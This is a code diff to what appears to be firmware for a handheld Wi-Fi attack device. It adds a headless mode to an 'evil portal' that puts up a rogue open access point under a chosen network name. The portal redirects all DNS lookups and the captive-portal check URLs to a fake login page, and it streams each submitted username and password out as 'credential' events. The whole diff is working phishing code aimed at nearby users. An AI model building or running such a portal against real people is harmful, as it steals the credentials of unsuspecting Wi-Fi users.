@@ -1,5 +1,6 @@
 #include "evil_portal.h"
 
+#include <ArduinoJson.h>
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <WiFi.h>
@@ -144,4 +145,71 @@ void EvilPortalScreen::draw() {
   g.setTextColor(TFT_DARKGREY, TFT_BLACK);
   g.setCursor(4, hal.h() - 9);
   g.print("A ssid  B(hold) back");
+}
+
+// ---------------- headless streaming ----------------
+
+namespace {
+size_t g_pCursor = 0;
+String g_pSsid;
+
+void portalUp(const char* ssid) {
+  g_pSsid = ssid;
+  g_portalHits.clear();
+  g_pCursor = 0;
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(ssid);
+  WiFi.setSleep(false);
+  const IPAddress ip = WiFi.softAPIP();
+  g_dns = new DNSServer();
+  g_dns->start(53, "*", ip);
+  g_web = new WebServer(80);
+  g_web->on("/login", HTTP_POST, handleLogin);
+  g_web->on("/generate_204", handleRoot);
+  g_web->on("/hotspot-detect.html", handleRoot);
+  g_web->on("/ncsi.txt", handleRoot);
+  g_web->onNotFound(handleRoot);
+  g_web->begin();
+  g_up = true;
+}
+}  // namespace
+
+bool portalStreamStart(const std::string& params) {
+  JsonDocument p;
+  const char* ssid = kSsids[0];
+  if (deserializeJson(p, params) == DeserializationError::Ok &&
+      p["ssid"].is<const char*>())
+    ssid = p["ssid"];
+  portalUp(ssid);
+  return true;
+}
+
+void portalStreamPoll(const StrikeEmit& emit) {
+  if (g_dns) g_dns->processNextRequest();
+  if (g_web) g_web->handleClient();
+  while (g_pCursor < g_portalHits.size()) {
+    const PortalHit& h = g_portalHits[g_pCursor++];
+    JsonDocument d;
+    d["ssid"] = g_pSsid;
+    d["field1"] = h.field1;
+    d["field2"] = h.field2;
+    emit("credential", d);
+  }
+}
+
+void portalStreamStop() {
+  if (g_web) {
+    g_web->stop();
+    delete g_web;
+    g_web = nullptr;
+  }
+  if (g_dns) {
+    g_dns->stop();
+    delete g_dns;
+    g_dns = nullptr;
+  }
+  WiFi.softAPdisconnect(true);
+  delay(20);
+  WiFi.mode(WIFI_OFF);
+  g_up = false;
 }
